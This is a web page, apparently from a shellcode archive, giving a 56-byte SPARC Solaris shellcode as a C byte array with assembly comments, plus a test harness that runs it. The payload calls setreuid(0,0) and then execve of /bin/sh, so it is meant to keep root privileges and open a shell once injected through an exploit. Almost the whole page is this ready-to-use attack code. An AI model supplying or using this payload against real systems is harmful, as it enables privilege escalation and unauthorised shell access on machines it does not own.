<html><head><title>Solaris/sparc - setreuid  - 56 bytes</title>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
<meta http-equiv="Content-Language" content="en" />
</head>


<pre>
/*
 * lhall@telegenetic.net
 * setreuid shellcode
 * full description of how it was done and defines at
 * http://www.telegenetic.net/sparc-shellcode.htm
 */

char shellcode[] =
&quot;\x90\x1A\x40\x09&quot;  /* xor %o1, %o1, %o0          */
&quot;\x92\x1A\x40\x09&quot;  /* xor %o1, %o1, %o1          */
&quot;\x82\x10\x20\xCA&quot;  /* mov SYS_SETREUID(202), %g1 */
&quot;\x91\xD0\x20\x08&quot;  /* ta KERNEL(0x08)            */
&quot;\x21\x0B\xD8\x9A&quot;  /* sethi %hi(0x2f626900), %l0 */
&quot;\xA0\x14\x21\x6E&quot;  /* or %l0, %lo(0x16e), %l0    */
&quot;\x23\x0B\xDC\xDA&quot;  /* sethi %hi(0x2f736800), %l1 */
&quot;\xE0\x3B\xBF\xF0&quot;  /* std %l0, [%sp - 0x10]      */
&quot;\x90\x23\xA0\x10&quot;  /* sub %sp, 0x10, %o0         */
&quot;\xD0\x23\xBF\xF8&quot;  /* st  %o0, [%sp - 0x8]       */
&quot;\x92\x23\xA0\x08&quot;  /* sub %sp, 0x8, %o1          */
&quot;\x94\x1A\x80\x0A&quot;  /* xor %o2, %o2, %o2          */
&quot;\x82\x10\x20\x3B&quot;  /* mov SYS_EXECVE(59), %g1    */
&quot;\x91\xD0\x20\x08&quot;; /* ta KERNEL(0x08)            */

int
main (int argc, char **argv)
{
       int (*ret)();
       ret = (int(*)())shellcode;
       (int)(*ret)();
       exit(0);
}


<body><script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src=%27" + gaJsHost + "google-analytics.com/ga.js%27 type=%27text/javascript%27%3E%3C/script%3E"));
</script>

<script type="text/javascript">
try {
var pageTracker = _gat._getTracker("UA-6809519-1");
pageTracker._trackPageview();
} catch(err) {}</script></body></html>
